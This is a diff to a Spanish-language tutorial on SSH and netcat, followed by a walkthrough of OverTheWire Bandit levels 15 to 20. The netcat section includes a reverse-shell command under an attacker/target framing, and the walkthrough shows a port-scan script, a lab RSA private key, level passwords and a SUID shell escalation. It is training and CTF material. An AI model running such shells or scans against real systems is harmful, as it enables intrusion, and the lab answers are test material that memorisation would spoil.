@@ -31,6 +31,8 @@ Para comprobar el estado del servicio ssh pondemos hacer uso del comando `nc` (n
 nc -vz localhost 22
 ```
 
+_*Nota*_: En la siguiente sección se detalla el uso de [netcat](#netcat).
+
 ### StrickHostKeyChecking
 
 El parámetro `StrictHostKeyChecking` en SSH (Secure Shell) se utiliza para definir cómo el cliente SSH trata las claves de host al conectarse a un servidor por primera vez o cuando la clave del servidor cambia. Esta directiva es importante para evitar ataques de tipo "man-in-the-middle" (MITM), donde un atacante podría interceptar la conexión y hacerse pasar por el servidor legítimo. A continuación se definen cada uno de los valores que puedes asignar a `StrictHostKeyChecking`:
@@ -191,6 +193,9 @@ Last login: Sun Jun  9 13:48:45 2024 from 192.168.120.100
 kali
 ```
 
+_*Nota*_: En algunas veces podemos hacer el proceso inverso de conectarnos a un servidor haciendo uso de la clave privada para lo que se usa `ssh -i ~/.ssh/id_rsa usuario@servidor_remoto
+`.
+
 ## scp
 
 ### scp de máquina A -> B indicado desde máquina C
@@ -269,6 +274,139 @@ ssh -p 8733 user1@192.168.100.20 df -h && ls /tmp
 ```
 
 Este caso es incorrecto ya que el comando `df -h` se ejecutaría en el servidor pero el `ls /tmp` se lanzaría en el cliente si la conexión es exitosa por lo que tendríamos que poner entre comillas los dos comandos para no tener errores.
+
+## netcat
+
+Netcat (a menudo abreviado como `nc`) es una herramienta versátil de línea de comandos que permite establecer conexiones de red, tanto entrantes como salientes, utilizando los protocolos TCP y UDP. Es conocido como la "navaja suiza" de las herramientas de red debido a su amplio rango de funcionalidades.
+
+### **¿Qué se puede hacer con Netcat?**
+- **Escanear puertos** de un host.
+- **Transferir archivos** entre computadoras.
+- **Crear shells reversos** (muy usado en pruebas de penetración).
+- **Abrir puertos** y escuchar conexiones.
+- **Depurar y analizar** redes y servicios.
+- **Probar conexiones** TCP/UDP.
+
+### Uso Básico de Netcat
+
+#### 1. **Abrir un puerto y escuchar conexiones**:
+```bash
+nc -lvp 1234
+```
+- `-l` → Escuchar (listen).
+- `-v` → Modo detallado (verbose).
+- `-p 1234` → Puerto en el que se escuchará.
+
+##### Ejemplo de uso con kaliA y kaliB
+
+Para abrir un puerto y escuchar conexiones en un escenario con dos máquinas debemos tener los siguientes pasos:
+
+- **KaliA** con IP: 192.168.1.100
+- **KaliB** con IP: 192.168.1.101
+
+###### **Paso 1: Verificar la Instalación de Netcat**
+
+Antes de comenzar, asegúrese de que `netcat` esté instalado en ambas máquinas:
+
+```bash
+sudo apt install netcat  # Si no está instalado
+```
+
+###### **Paso 2: Abrir un Puerto en KaliA (192.168.1.100)**
+
+En **KaliA**, ejecute el siguiente comando para abrir un puerto y escuchar conexiones:
+
+```bash
+nc -lvp 1234
+```
+
+- `-l` : Modo escucha (listen).
+- `-v` : Modo detallado (verbose) para mostrar información de la conexión.
+- `-p 1234` : Puerto en el que Netcat estará escuchando (puedes elegir otro puerto si lo deseas).
+
+**Salida esperada:**
+
+```bash
+listening on [any] 1234 ...
+```
+
+> KaliA ahora está a la espera de conexiones entrantes en el puerto 1234.
+
+###### **Paso 3: Conectarse desde KaliB (192.168.1.101)**
+
+En **KaliB**, ejecute el siguiente comando para establecer la conexión con KaliA:
+
+```bash
+nc 192.168.1.100 1234
+```
+
+- `192.168.1.100` : Dirección IP de KaliA.
+- `1234` : Puerto en el que KaliA está escuchando.
+
+**Salida esperada en KaliA:**
+
+```bash
+connect to [192.168.1.100] from (UNKNOWN) [192.168.1.101] 45678
+```
+
+> La conexión ha sido establecida. Cualquier texto que escribas en una máquina será visto en la otra.
+
+###### **Paso 4: Verificar la Conexión**
+
+- Escribe cualquier mensaje en KaliB y lo verás en KaliA.
+- Escribe cualquier mensaje en KaliA y lo verás en KaliB.
+
+**Ejemplo:**
+
+```bash
+# En KaliB
+Hola KaliA
+```
+
+```bash
+# En KaliA
+Hola KaliB
+```
+
+#### 2. **Transferir archivos entre máquinas**:
+
+**En la máquina que recibe el archivo**:
+```bash
+nc -lvp 5555 > archivo_recibido.txt
+```
+
+**En la máquina que envía el archivo**:
+```bash
+nc 192.168.1.50 5555 < archivo_a_enviar.txt
+```
+
+#### 3. **Crear un shell reverso (muy usado en hacking)**:
+
+**En el atacante (escucha el shell)**:
+```bash
+nc -lvp 4444
+```
+
+**En el objetivo (abre el shell hacia el atacante)**:
+```bash
+/bin/bash | nc 192.168.1.100 4444
+```
+
+Esto dará al atacante un shell interactivo del sistema objetivo.
+
+#### 4. **Escanear puertos abiertos en una máquina**:
+```bash
+nc -zv 192.168.1.100 1-1000
+192.168.1.100: inverse host lookup failed: Host name lookup failure
+(UNKNOWN) [192.168.1.100] 22 (ssh) open
+```
+- `-z` → Escaneo sin enviar datos.
+- `-v` → Modo detallado.
+- `1-1000` → Rango de puertos a escanear.
+
+_*Nota*_: Como alternativa a`nc` tenemos `ncat` que ofrece como ventajas la posibilidad de realizar conexiones encriptadas por `ssl/tls`, soporte de IPv6 y limitar el número de conexiones simultaneas. 
+
+---
 
 ### Retos de SSH
 
@@ -741,4 +879,155 @@ bandit14@bandit:~$ nc localhost 30000
 MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
 Correct!
 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+```
+
+#### bandit15 --> bandit16
+
+```bash
+bandit15@bandit:~$ ncat --ssl localhost 30001
+8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
+Correct!
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+```
+
+#### bandit16 --> bandit17
+
+```bash
+#!/bin/bash
+
+for port in $(seq 31000 32000); do
+        (echo "" > /dev/tcp/127.0.0.1/${port}) 2>/dev/null && echo "[+] ${port} - OPEN" &
+done; wait
+```
+
+```bash
+bandit16@bandit:/tmp$ bash portScan.sh
+[+] 31046 - OPEN
+[+] 31518 - OPEN
+[+] 31691 - OPEN
+[+] 31790 - OPEN
+[+] 31960 - OPEN
+
+bandit16@bandit:/tmp$ nmap --open -T5 -v -n -p31000-32000 127.0.0.1
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 20:25 UTC
+Initiating Ping Scan at 20:25
+Scanning 127.0.0.1 [2 ports]
+Completed Ping Scan at 20:25, 0.00s elapsed (1 total hosts)
+Initiating Connect Scan at 20:25
+Scanning 127.0.0.1 [1001 ports]
+Discovered open port 31790/tcp on 127.0.0.1
+Discovered open port 31691/tcp on 127.0.0.1
+Discovered open port 31960/tcp on 127.0.0.1
+Discovered open port 31046/tcp on 127.0.0.1
+Discovered open port 31518/tcp on 127.0.0.1
+Completed Connect Scan at 20:25, 0.06s elapsed (1001 total ports)
+Nmap scan report for 127.0.0.1
+Host is up (0.00018s latency).
+Not shown: 996 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
+
+# Miramos que puerto de los cinco es el correcto
+
+bandit16@bandit:/tmp$ ncat --ssl 127.0.0.1 31790
+kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
+Correct!
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+bandit16@bandit:/tmp$ nano id_rsa
+
+bandit16@bandit:/tmp$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
+imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
+Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
+77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
+dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
+vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
+-----END RSA PRIVATE KEY-----
+
+bandit16@bandit:/tmp$ ssh -i id_rsa bandit17@localhost
+
+bandit16@bandit:/tmp$ ssh -i id_rsa -p 2220 bandit17@localhost
+
+bandit17@bandit:~$ whoami
+bandit17
+
+bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
+EReVavePLFHtFlFsjn3hyzMlvSuSAcRD
+```
+
+#### bandit17 --> bandit18
+
+```bash
+bandit17@bandit:~$ diff passwords.old passwords.new
+42c42
+< ktfgBvpMzWKR5ENj26IbLGSblgUG9CzB
+---
+> x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO
+```
+
+#### bandit18 --> bandit19
+
+```bash
+PS C:\Users\Carballeira> ssh -p 2220 bandit18@bandit.labs.overthewire.org whoami
+                         _                     _ _ _
+                        | |__   __ _ _ __   __| (_) |_
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+
+bandit18
+
+PS C:\Users\Carballeira> ssh -p 2220 bandit18@bandit.labs.overthewire.org bash
+                         _                     _ _ _
+                        | |__   __ _ _ __   __| (_) |_
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+
+
+                      This is an OverTheWire game server.
+            More information on http://www.overthewire.org/wargames
+
+bandit18@bandit.labs.overthewire.org's password:
+ls -l
+total 4
+-rw-r----- 1 bandit19 bandit18 33 Sep 19 07:08 readme
+cat readme
+cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8
+```
+
+#### bandit19 --> bandit20
+
+```bash
+bandit19@bandit:~$ ls -l
+total 16
+-rwsr-x--- 1 bandit20 bandit19 14880 Sep 19 07:08 bandit20-do
+
+bandit19@bandit:~$ ./bandit20-do bash -p
+bash-5.2$ whoami
+bandit20
+bash-5.2$ cat /etc/bandit_pass/bandit20
+0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
 ```
